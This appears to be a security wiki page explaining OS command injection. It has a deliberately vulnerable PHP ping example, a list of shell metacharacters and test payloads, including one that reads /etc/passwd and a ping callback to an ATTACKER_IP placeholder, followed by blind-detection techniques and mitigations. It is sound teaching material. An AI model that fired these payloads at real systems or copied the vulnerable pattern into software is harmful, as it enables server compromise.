# What is Command Injection?

Command injection (OS command injection) happens when an app passes untrusted input into a system shell. Instead of your input staying *data*, it becomes part of a command the server runs, letting you execute arbitrary OS commands with the privileges of the web process. It is less common than it used to be, but when you find it, it is usually instant remote code execution.

## How it works

A developer builds a shell command by concatenating user input:

```php
// VULNERABLE
$host = $_GET['host'];
system("ping -c 1 " . $host);
```

Request `?host=8.8.8.8; id` and the server runs:

```bash
ping -c 1 8.8.8.8; id
```

The `;` ends the ping and runs `id` as a second command.

## Shell metacharacters to test

```text
;      run a second command
|      pipe output into another command
||     run if the first fails
&&     run if the first succeeds
&      background / separate command
`cmd`  command substitution (backticks)
$(cmd) command substitution
%0a    newline (URL-encoded)
```

## Test payloads

```bash
127.0.0.1; id
127.0.0.1 | whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1$(sleep 5)        # blind: time delay confirms execution
; ping -c 5 ATTACKER_IP    # blind: out-of-band callback
```

## Blind command injection

No output on the page? Confirm execution indirectly:

- **Time-based:** `& sleep 10 &` - page hangs if injectable
- **Out-of-band:** force a DNS/HTTP callback to a server you control (Burp Collaborator / interactsh)
- **File write:** redirect output to a web-readable path and fetch it

## Tools

- [Burp Suite](../../Tools/Burp%20Suite.md) Repeater and Intruder
- `commix` - automated command injection exploitation
- interactsh / Burp Collaborator for OOB detection

## Mitigation

- Avoid shelling out. Use language-native APIs instead of `system()`/`exec()`.
- If you must, pass arguments as an **array**, never a concatenated string, and disable shell interpretation.
- Allowlist expected input (e.g. validate an IP with a strict regex).
- Run the service with least privilege.

## CWE

- CWE-78: Improper Neutralization of Special Elements used in an OS Command

## Deep dive

- [PortSwigger OS command injection labs](https://portswigger.net/web-security/os-command-injection)
- [Injection - OWASP Top 10](../OWASP%20Top%2010/Injection.md)
